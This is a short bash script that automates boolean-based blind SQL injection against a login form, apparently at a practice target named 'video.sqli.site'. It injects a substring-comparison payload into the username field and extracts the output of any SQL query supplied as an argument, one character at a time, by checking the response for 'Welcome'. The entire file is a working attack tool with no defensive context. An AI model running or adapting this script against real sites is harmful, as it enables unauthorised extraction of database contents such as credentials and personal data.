#!/bin/bash

charset=`echo {0..9} {A..z} \. \: \, \; \- \_ \@`

export URL="http://1.video.sqli.site/login.php"
export truestring="Welcome"
export maxlength=$1
export query=$2

export result=""

echo "Extracting the results fo $query..."

for((j=1;j<$maxlength;j+=1))
do
	export ntchar=$j

	for i in $charset
	do
		curl -d "username=a'+or+substring(($query),$ntchar,1)='$i'+--+-&password=b&submit=Login" -s -X POST $URL | grep "$truestring" &> /dev/null
		if [ "$?" == "0" ]
		then
			echo Character number $ntchar found: $i
			export result+=$i
			break
		fi
	done
done

echo Result: $result
